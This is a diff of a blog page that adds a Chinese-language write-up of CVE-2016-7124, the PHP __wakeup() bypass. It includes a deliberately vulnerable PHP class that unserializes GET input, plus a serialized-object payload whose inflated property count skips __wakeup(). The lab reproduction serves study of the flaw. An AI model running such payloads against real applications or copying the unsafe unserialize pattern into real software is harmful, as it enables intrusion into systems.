@@ -95,7 +95,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">0</span>
+            <span class="post-count">327</span>
         </span>
     </span>
 
@@ -111,13 +111,37 @@
  
     </div>
       
+    <div class="tocbot"></div>
+
 
 
 
   
     <div class="article-entry" itemprop="articleBody">
        
-   
+  <h1 id="CVE-2016-7124"><a href="#CVE-2016-7124" class="headerlink" title="CVE-2016-7124"></a>CVE-2016-7124</h1><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>服务器：apache 2.4.39</p>
+<p>PHP版本：5.3.29nts</p>
+<h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><p>PHP5 &lt; 5.6.25</p>
+<p>PHP7 &lt; 7.0.10</p>
+<h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><p>类中的wakeup()方法的绕过</p>
+<h2 id="代码复现"><a href="#代码复现" class="headerlink" title="代码复现"></a>代码复现</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yuleiyun</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$target</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$b</span>=<span class="string">&quot;b&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	 <span class="variable language_">$this</span>-&gt;num=<span class="string">&quot;123&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="variable language_">$this</span>-&gt;targer=<span class="string">&quot;10&quot;</span>;</span><br><span class="line">	   <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;num)||!<span class="variable language_">$this</span>-&gt;num)</span><br><span class="line">		   <span class="keyword">echo</span> <span class="string">&quot;you got it!&quot;</span>; </span><br><span class="line">	   <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&quot;haha&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>逻辑为：destruct中的num值未设置或者为空时，才会有输出。</p>
+<p>已知num这个值无法更改，所以尝试使num值未设置，则要绕过wakeup()。首先我们上传的参数要为序列化后的字符串：</p>
+<p>如：</p>
+<blockquote>
+<p>?test&#x3D;O:8:”Yuleiyun”:2:{s:6:”target”;N;s:1:”b”;s:1:”b”;}</p>
+<p>结果：</p>
+<p>object(Yuleiyun)#1 (3) { [“target”]&#x3D;&gt; NULL [“b”]&#x3D;&gt; string(1) “b” [“num”]&#x3D;&gt; string(3) “123” } haha</p>
+</blockquote>
+<p>由于wakeup函数存在且比反序列化先触发，故，只要使得反序列化过程中的结构不匹配，导致 PHP 在反序列化时无法正确还原对象的结构，进而无法触发wakeup()方法。</p>
+<p>如把成员数量由2改为3，不触发wakeup()，结果为</p>
+<blockquote>
+<p>?test&#x3D;O:8:”Yuleiyun”:3:{s:6:”target”;N;s:1:”b”;s:1:”b”;}</p>
+<p>结果：</p>
+<p>you got it!bool(false)</p>
+</blockquote>
+ 
       <!-- reward -->
       
     </div>
